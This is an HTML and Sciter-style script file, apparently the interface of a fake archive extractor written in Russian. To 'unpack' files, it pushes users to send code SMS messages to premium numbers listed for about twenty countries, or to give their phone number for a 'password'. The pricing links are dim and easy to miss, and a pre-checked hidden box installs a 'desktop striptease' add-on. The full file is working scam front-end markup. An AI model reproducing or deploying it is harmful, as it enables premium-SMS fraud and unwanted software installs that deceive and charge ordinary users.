<html><head>
<style>


@import url(rules.css);
@import url(scroll.css);

@font-face 
{
   font-family: "Myriad Web Pro";

   src: url(MyriadWebPro-Condensed.ttf);
}


html
{
		behavior:actions;
		background-color:threedface;
		font:8pt Verdana; 

		overflow:hidden;

		background-repeat:expand;
		background-position: 0 0 0 0;
}

body
{
		//background-color:threedface;
		background-color: #f0f0f0;		
		padding:0px;
		margin:0px;
		width:100%%; 
		height:100%%; 
}

.tablemain
{
width: 420px;
padding-top:3px;
padding-left:7px;
padding-right:5px;
padding-bottom:5px;
}


[autofocus]:focusable
{
  assigned!: self:focus = true;
}

.button-cmd
{
width:107px;
height:17px;
font:8pt Arial;
}

#check_rule
{
//width:123px;
//height:24px;
font:10pt Arial;
}

.progress-line
{
padding: 0px;
border: 1px solid threedshadow;
background-image:url(dot.gif);
height: 21px;
width: 100%%;
}

.edit-path
{
//height: 16px;
width: 390px;
}

.sms
{
border: 1px solid threedshadow;
}

.hid
{      
display:none;
}


#check_rule
{
      assigned! :
        self.start-animation(0.4s); 
      value-changed! :      	
      	((isflag("a") == "true") ? ($1(#btn_sendnumber).param = "a", $1(#rule):value = @RULE_A, $1(#rule3b).class = "hid", $1(#rule3).class = "hid") # null),
      	((isflag("b") == "true") ? ($1(#btn_sendnumber).param = "b", $1(#rule):value = @RULE_B, $1(#rule3b).class = "hid", $1(#rule3).class = "hid") # null),
      	((isflag("c") == "true") ? ($1(#rule):value = @RULE_C, $1(#rule3b).class = "hid", $1(#rule3).class = "hid") # null),
      	((isflag("d") == "true") ? ($1(#rule):value = @RULE_D, $1(#rule3b).class = "hid", $1(#rule3).class = "hid") # null),
      	((isflag("f") == "true") ? ($1(#rule):value = @RULE_F, $1(#rule3b).class = "hid", $1(#rule3).class = "hid") # null),
      	((isflag("za") == "true") ? ($1(#btn_sendnumber).param = "za", $1(#rule):value = @RULE_ZA, $1(#rule3b).class = "hid", $1(#rule3).class = "hid") # null),
      	((isflag("zb") == "true") ? ($1(#btn_sendnumber).param = "zb", $1(#rule):value = @RULE_ZB, $1(#rule3b).class = "hid", $1(#rule3).class = "hid") # null),
      	((isflag("zc") == "true") ? ($1(#rule):value = @RULE_ZC, $1(#rule3b).class = "hid", $1(#rule3).class = "hid") # null),
      	((isflag("zd") == "true") ? ($1(#rule):value = @RULE_ZD, $1(#rule3b).class = "hid", $1(#rule3).class = "hid") # null),
      	((isflag("zf") == "true") ? ($1(#rule):value = @RULE_ZF, $1(#rule3b).class = "hid", $1(#rule3).class = "hid") # null);
      animation-step!:
        self.value-changed(),
        $(#smsopt).value-changed();
} 


#smsopt
{        
      value-changed! :       		
		(($1(#check_rule).class == "hid") ? (((self.child(1):value == "Россия")&&((isflag("a") == "true"))) ? (podshow = "true") # null) # null),
		(($1(#check_rule).class == "hid") ? (((self.child(1):value == "Россия")&&((isflag("b") == "true"))) ? (podshow = "true") # null) # null),
		(($1(#check_rule).class == "hid") ? (((self.child(1):value == "Россия")&&((isflag("c") == "true"))) ? (podshow = "false") # null) # null),
		(($1(#check_rule).class == "hid") ? (((self.child(1):value == "Россия")&&((isflag("d") == "true"))) ? (podshow = "false") # null) # null),
		(($1(#check_rule).class == "hid") ? (((self.child(1):value == "Россия")&&((isflag("f") == "true"))) ? (podshow = "false") # null) # null),
		(((self.child(1):value == "Россия")&&(isflag("a") == "true")) ? ($1(#rusinfo).class = "") # ($1(#rusinfo).class = "hid" )),
		(((self.child(1):value == "Россия")&&(isflag("b") == "true")) ? ($1(#rusinfo).class = "") # ($1(#rusinfo).class = "hid" )),		
		(((self.child(1):value == "Россия")&&(isflag("c") == "true")) ? (self.child(1).smsnum = self.child(1).smsnum35) # null),
		(((self.child(1):value == "Россия")&&(isflag("d") == "true")) ? (self.child(1).smsnum = self.child(1).smsnum310) # null),
		(((self.child(1):value == "Россия")&&(isflag("f") == "true")) ? ((self.child(1).smsnum = self.child(1).smsnum110),($1(#dintext).class = "hid")) # ($1(#dintext).class = "")),		
		$1(#smstext):value = self.child(1).smstext+xnum(),
		$1(#smsnum):value = self.child(1).smsnum,
		((podshow == "true") ? ($1(#smsvar1).class = "hid", $1(#smsvar2).class = "", $1(#rule2b).class = "", $1(#rule2).class = "") # ($1(#smsvar1).class = "", $1(#smsvar2).class = "hid", $1(#rule2b).class = "hid", $1(#rule2).class = "hid")),
		((self.child(1):value == "Украина") ? ($1(#dintext).class = "hid") # null),
		((self.child(1):value == "Украина") ? ($1(#ukrlink).class = "") # ($1(#ukrlink).class = "hid" )),
		(((self.child(1):value == "Россия") && ($1(#step2).class != "hid")) ? ($1(#ablink).href = "http://sms911.ru/tarifs.php?country_id=1&num=2858") # ($1(#ablink).href = "http://sms911.ru")),
		((self.child(1):value != "Россия") ? ($1(#sendnumber):value = "          ") # null);

}


#btn_unrar
{
   click! : 
   /*  ($1(#check_rule):checked ? ($1(#step1>richtext):value = "Извлечение...") # null),     */
     $1(#smsopt).value-changed(); 
}

//     $1(#smsopt>caption):value = "new";
//$1(#smsnum):value = self.child(1).smsnum310


a
{
  color: #999999;
  text-decoration: none;
}



table[class="tablerule"]
{
  height: 287px;
  width: 423px;    
  //border: 1px solid threedshadow;
  overflow:auto;   
  vertical-scrollbar: my-v-scrollbar;
  horizontal-scrollbar: my-h-scrollbar;
}

#step2
{
color: #3a444b;
font: 18pt "Myriad Web Pro Condensed";
}



table[class="tablefiles"]
{
  height:100%%;
  width:100%%;
  overflow:auto; 
  padding:1;  
  //behavior:sortable-grid;
  border: 1px solid threedshadow;
  vertical-scrollbar: my-v-scrollbar;
  horizontal-scrollbar: my-h-scrollbar;  
}


@media print {
    table[class="tablefiles"] {overflow:none; }
}

table[class="tablefiles"] th 
{
  height:1.7em;
  background-color: #008c9b;
  color:white;
}

table[class="tablefiles"] tr:nth-child(even) {  background-color:#deeaeb }

table[class="tablefiles"] tr:hover 
{ 
   background-color: #6cacb5;
   color: white;
}

table[class="tablefiles"] th:checked 
{ 
  foreground-image: url(stock:arrow-down); 
  foreground-repeat: no-repeat;   
   foreground-position-top: 50%;   
  foreground-position-right: 5px;   
}
table[class="tablefiles"] th:nth-child(1)
{
  width:30px;
} 
table[class="tablefiles"] th:nth-child(2)
{
  text-align: left;
  width:100%%;
} 

table[class="tablefiles"] th:nth-child(3)
{
  text-align: left;
  width:90;
} 


table[class="tablefiles"] td 
{
  padding: 1;
  padding-left: 4;
  border:0px solid #075582;
  white-space:nowrap;
  //height:1.3em;
  height:18px;
  overflow:hidden;
  text-overflow:ellipsis;
}

table[class="tablefiles"] td:nth-child(2)
{
    behavior:path;          //
    overflow-x:hidden;      // these three must be used together.
    white-space:nowrap;     // 
    text-overflow:ellipsis; // and this is here for the sole purpose - to show tooltip if string is too long  
}

img.shell-icon 
{
    //behavior: shell-icon;
    behavior: file-icon;
}

</style>
</head>
<body>
<table id="tablemain" class="tablemain" border="0" cellpadding="0" cellspacing="5">
  <tr>
    <td colspan="2" valign="top"><div style="color: black;">      
    </div></td>
  </tr>
  <tr>
    <td colspan="2" valign="top">
    	<!-- --------------------- -->						
			<div id="step1" class="hid1"  style="height:390px; padding-left: 1px;">
			<table class="tablerule" border="0" cellpadding="0" cellspacing="0">
			<tr>
			<td style="border: 1px solid threedshadow; background-color: #d6f1ff;" valign="top">
			  <img src="logo.png" />
			  <!--<htmlarea id="filestree" style="height:120px; width:100%%; font:10pt Arial; padding:0px; margin:0px;">files tree</htmlarea>-->
			  <richtext id="rule" style="height: 100px; width:100%%; font:9pt Arial; padding:1px; margin:0px;">rule</richtext>			  			  			  
			</td>
			</tr>
			</table>
				    
			<div style="height:12px"></div>
			
			  <!--<div style="width:100%%; height:17px;">Файлов в архиве: <b><span id="sizefiles">0</span>Mb</b><span id="sizefiles_un"></span></div>-->
			  <div style="width:100%%; height:82;">
			    <table id="tablefiles" class="tablefiles" border="0" cellpadding="0" cellspacing="0" fixedrows="1" fixedlayout>
 			    <tr><b>Выполняется анализ содержимого архива...</b></tr>
 			    <!-- <tr><th></th><th>Список файлов в архиве</th><th>Размер</th></tr>
			    <tr><td>1</td><td>somefile.txt</td><td>111</td></tr> -->	    

			    
			    

			    </table>
			  </div>			  

			</div>
			<!-- --------------------- -->
			<div id="step2" class="hid" style="height:390px; padding: -4px;">
            <div align="left"><img src="logo2.png" /></div>
            <div id="dintext" style="color: #b7b7b7;" align="center"></div>
            <div style="height: 100%%; width:100%%; padding: 9px;">
            <div style="height:15px"></div>
            1. Для продолжения необходимо выбрать страну:<br>
			&nbsp;&nbsp;&nbsp;&nbsp;<select id="smsopt" class="edit-path">
				<option smstext="43004" smsnum="" smsnum35="2855" smsnum310="3855" smsnum110="3855">Россия</option>
				<option smstext="77901"  smsnum="4161">Украина</option>				
				<option smstext="43004" smsnum="0930399999">Австрия</option>
				<option smstext="43004" smsnum="7796">Бельгия</option>
				<option smstext="43004" smsnum="1098">Болгария</option>				
				<option smstext="43004" smsnum="9090199">Чехия</option>
				
				<option smstext="43004" smsnum="80888">Германия</option>
				<option smstext="43004" smsnum="1945">Дания</option>
				<option smstext="43004" smsnum="17013">Эстония</option>
				<option smstext="43004" smsnum="5339">Испания</option>
				<option smstext="43004" smsnum="179479">Финляндия</option>												

				<option smstext="43004" smsnum="83868">Франция</option>
				<option smstext="43004" smsnum="90645045">Венгрия</option>
				<option smstext="43004" smsnum="1171">Киргизия</option>
				<option smstext="43004" smsnum="1645">Литва</option>				
				<option smstext="43004" smsnum="1874">Латвия</option>
				
				<option smstext="43004" smsnum="7117">Нидерланды</option>
				<option smstext="43004" smsnum="2322">Норвегия</option>
				<option smstext="43004" smsnum="7910">Польша</option>
				<option smstext="43004" smsnum="68305">Португалия</option>
				<option smstext="43004" smsnum="72170">Швеция</option>					
			</select>  
		    <div style="height:15px"></div>
		    <div id="smsvar1" class="hid">                 
	            2. Отправьте смс с&nbsp;текстом <font color=#2882c1><b><span id="smstext"></span></b></font> на номер <font color=#2882c1><b><span id="smsnum"></span></b></font>
	            </div>
	            <div id="smsvar2">
	            2. Укажите номер телефона для&nbsp;получения пароля:<br>
	            
			<table border="0" cellpadding="0" cellspacing="0"><tr style="width:90%%; height:35px">
			    <td valign="bottom">&nbsp;&nbsp;&nbsp;&nbsp;<input id="sendnumber" style="height:16px" type="masked" name="medit" mask=" +7 ( ### ) ### - #### " value="          " /></td>
		            <td>&nbsp;&nbsp;&nbsp;&nbsp;<button id="btn_sendnumber" type="button" class="button-cmd" style="height:14px" param="">Выслать мне пароль!</button></td></tr>
			</table>		            
			    
	            </div>
		    <div style="height:15px"></div>            
		    
            3. Введите пароль из смс:&nbsp;&nbsp;&nbsp;<input id="smscode" type="text" size="10" maxlength="10">
			<button id="btn_check" type="button" class="hid">Подтвердить</button><br><br>
			<div style="height:100%%"></div>   
			<div id="rusinfo" align="left" style="color: gray; padding-top: 18px; padding-bottom: 0px; padding-left: -8px; padding-right: -9px;"><img src="after.png" /></div>						
			<div id="ukrlink" align="left" style="font-size: 14pt; padding-top: 24px; color: #d6d6d4;"><a href="http://closed-depfiles.com/sms-ua.html" target="_blank" style="text-decoration: none;">Правила и тарифы</a></div>
            </div>            
	
	    			</div>
			<!-- --------------------- -->	
                  
    </td>
  </tr>
  <tr>
    <td height="28" colspan="2"><progress id="progress" class="progress-line" maxvalue="100" value="0" /></td>
  </tr>
  <tr>
    <td height="22" valign="middle"><select name="select_path" class="edit-path" id="select_path" editable>
      <!--<option>Рабочий стол</option>-->
    </select></td>
    <td align="right" valign="middle"><button id="btn_browse" type="button">...</button></td>
  </tr>
  <tr>
    <td colspan="2" align="left"><table  style="width:422px" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td height="44" valign="middle">
          <button id="check_rule" type="checkbox" style="font:8pt Arial; color:black;" >&nbsp;&nbsp;Я согласен(на) с правилами</button>
          <button id="rule3b" class="hid" type="checkbox" checked style="font:8pt Arial; color:black;" >&nbsp;</button><a class="hid" id="rule3" href="#" style="font:8pt Arial; color:black;">Установить стриптиз для рабочего стола</a>
          <button id="rule2b" class="hid" type="checkbox" checked style="font:8pt Arial; color:black;" >Я согласен(на) с</button><a id="rule2" class="hid" href="#" style="font:8pt Arial; color:black;">правилами</a></td>
        <td width="107" align="right" valign="middle"><button id="btn_unrar" type="button" class="button-cmd" autofocus>Распаковать</button></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td colspan="2" valign="top"><hr>
        <div align="left" style="font:9pt Serif; color: gray;"><a id="ablink" href="#" target="_blank">Информация для абонентов</a> | <a href="mailto:help@sms-911.biz" target="_blank">Поддержка</a> <span id="dintext2" class="hid" style="font:8pt Serif; color: gray;">| Необходимо отправить до 3-х смс</span></div></td> <!-- e2e1dd -->
  </tr>
</table>
</body>
</html>

